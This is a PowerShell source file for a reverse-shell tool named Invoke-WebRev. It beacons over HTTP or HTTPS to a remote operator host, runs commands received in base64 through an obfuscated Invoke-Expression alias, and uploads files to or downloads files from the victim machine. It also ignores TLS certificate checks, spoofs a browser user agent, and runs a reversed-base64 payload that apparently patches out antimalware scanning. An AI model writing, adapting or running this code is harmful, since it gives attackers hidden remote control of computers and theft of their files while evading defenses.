function Invoke-WebRev{
    param
    (
        [string]$ip,
        [string]$port,
        [switch]$ssl
    )

    $help=@"

.SYNOPSIS
    WebRev.
    PowerShell Function: Invoke-WebRev
    Author: Hector de Armas (3v4Si0N)

    Dependencias Requeridas: Ninguna
    Dependencias Opcionales: Ninguna
.DESCRIPTION
    .

.ARGUMENTS
    -ip   <IP>      Remote Host
    -port <PORT>    Remote Port
    -ssl            Send traffic over ssl

.EXAMPLE
    Invoke-Webrev -ip 192.168.29.131 -port 80
    Invoke-Webrev -ip 192.168.29.131 -port 443 -ssl
"@

    if(-not $ip -or -not $port) { return $help; }
    
    if ($ssl) { $url="https://" + $ip + ":" + $port + "/"; } else { $url="http://" + $ip + ":" + $port + "/"; }
    $x = "taleska-ei-vrixeka"; Set-alias $x ($x[$true-10] + ($x[[byte]("0x" + "FF") - 265]) + $x[[byte]("0x" + "9a") - 158]);
    Invoke-PatchMe;
    $pwd_b64 = getPwd;
    $json = '{"type":"newclient", "result":"", "pwd":"' + $pwd_b64 + '"}';
    
    [System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy();
    [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
    $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12';
    [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols;
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
    try { $error[0] = ""; } catch {}

    while ($true)
    {
        try
        {
            $req = Invoke-WebRequest $url -useb -Method POST -Body $json -UserAgent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" -ContentType "application/json";
            $header = $req.Headers["Authorization"];
            $c = [System.Convert]::FromBase64String($header);
            $cstr = [System.Text.Encoding]::UTF8.GetString($c);
            $result = "";
            $dataToSend = "";

            if($cstr.split(" ")[0] -eq "upload")
            {
                $type = '"type":"UPL04D"';
                try
                {
                    $uploadData = [System.Text.Encoding]::ASCII.GetString($req.Content);
                    $location = $cstr.split(" ")[2];
                    $content = [System.Convert]::FromBase64String($uploadData);
                    $content | Set-Content $location -Encoding Byte
                    $result = '[+] File successfully uploaded.';
                }
                catch {}
            }

            elseif($cstr.split(" ")[0] -eq "download")
            {
                $type = '"type":"D0WNL04D"';
                $commarray = $cstr.split(" ");
                try
                {
                    $pathSrc = $commarray[1];
                    $pathDst = $commarray[2];
                    if (Test-Path -Path $pathSrc) 
                    {
                        $downloadData = [System.IO.File]::ReadAllBytes($pathSrc);
                        $b64 = [System.Convert]::ToBase64String($downloadData);
                        $result = '[+] File successfully downloaded.", ' + '"file":"' + $b64 + '", ' + '"pathDst":"' + $pathDst;
                    } 
                    else
                    {
                        $result = '[!] Source file not found!';
                    }
                }
                catch {}
            }
            else
            {
                $type = '"type":"C0MM4ND"';                
                $enc = [system.Text.Encoding]::UTF8;
                $new = (taleska-ei-vrixeka $cstr | Out-String);

                $bytes = $enc.GetBytes($new);
                $bytes2 = $enc.GetBytes($result);
                $result = [Convert]::ToBase64String($bytes2 + $bytes);
            }

            if ($cstr.split(" ")[0] -eq "cd") {
                $pwd_b64 = getPwd;
            }
            $json = '{' + $type + ', "result":"' + $result + '", "pwd":"' + $pwd_b64 + '"}';
        }
        catch
        {
            if ($error[0] -ne "")
            {
                try
                {
                    $type = '"type":"3RR0R"';
                    $err = $error[0] | Out-String;
                    $error[0]= "";

                    $bytes = $enc.GetBytes($err);
                    $result = [Convert]::ToBase64String($bytes);
                    $json = '{' + $type + ', "result":"' + $result + '", "pwd":"' + $pwd_b64 + '"}';
                } catch {}
            }
        };
    };
}


function getPwd()
{
    $enc = [system.Text.Encoding]::UTF8;
    $pwd = "pwd | Format-Table -HideTableHeaders";
    $pwd_res = (taleska-ei-vrixeka $pwd | Out-String);
    $bytes = $enc.GetBytes($pwd_res);
    $pwd_b64 = [Convert]::ToBase64String($bytes);
    return $pwd_b64;
}


function Invoke-PatchMe
{
    $base64 = "==QK2ACLzNXZyRGZBRCIsADIsg2Y0FGUkgSew92Q6oTXsFGazJXYN5yclNWa2JXZTB3byVGdulkLl1Wa05WdS5SblR3c5N1WK0QKzMEewACLwgDewACL3ADewACLwADewACL3UDewACL4IEewgCId11WlRXeCtFI9ACajRXYQRiCNwGb15UL0V3TgwHIpAHJdZWZytFIsADN4BDIsUTXyMDdulWdbBCLzNXZyRGZBRCK0NWZ09mcQxWY1RncpZlO601czFGbDlXTbpQDwASPgAHJK0QKiIXZmZWdCJCIrAiIuF2YTJCIrAiIpNXbBJCIsknchJnYpxEZh9GTkgyczVmckRWQj9mcQRXZHpjOdN3chx2Q510Wg0DIzNXZyRGZBRiCNkiIsxGZuk2ciAyKgISbhJCK5JXYyJWaMRWYvxkO601czFGbDlXTbBSPgknchJnYpxEZh9GTkoQDK0wczFGbDlXTkASZwlHVtQGZBpQDK0AQioQD9pQDK0wOpQ3YlR3byBFZs9EbmBHbgQnbpVHI0V3bgwCdjVGdvJHU3VmTsZGI05Wa1BCLlpXaTdHZgIHdQRnbJVFIsM3clJHZkFEcsBic0BFdulEK0NWZ09mcQxWY1RncpZFIs92biBibyVGd4VGIjlGdhR3cgMWasJWdwBCIgAiCN0VKiIzMsVmbyV2aigCdy9GctlEbsR0WgACIgoQDK0wOpUWbh5GIn5WayR3coknchJnYpxEZh9GTgIHdQRnbJBibyVGd4VGIjlGdhR3cgMWasJWdwBCIgAiCN0VKiIzMsVmbyV2aigCdy9GctlEbsR0WgACIgoQDK0wOpUWbh50YvJHcgcmbpJHdzBCLlxWdk9WToBic0BFdulEKzNXZyRGZBN2byBFdldEIyRHU05WSg4mclRHelByYpRXY0NHIjlGbiVHcgACIgoQDdliIyMDbl5mcltmIoQncvBXbJxGbEtFIgACIK0gCNsHIzNXYsNUeNByczFGbjByYpxmY1BnCNoQD7MXZjlmdyV2Uw9mclRnbJ5SZtlGduVnUu0WZ0NXeTByZul2c1pQD70WZ0NXeTByZul2c1pQDiAEI9AyczFGbDlXTkoQDK0AbsVnbkASPgM3chx2Q51EJ";
    $base64array = $base64.ToCharArray() ; [array]::Reverse($base64array) ; -join $base64array 2>&1> $null;
    $base64string = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$base64array"));
    taleska-ei-vrixeka $base64string | Out-Null;
}

#Invoke-WebRev -ip 192.168.29.131 -port 80
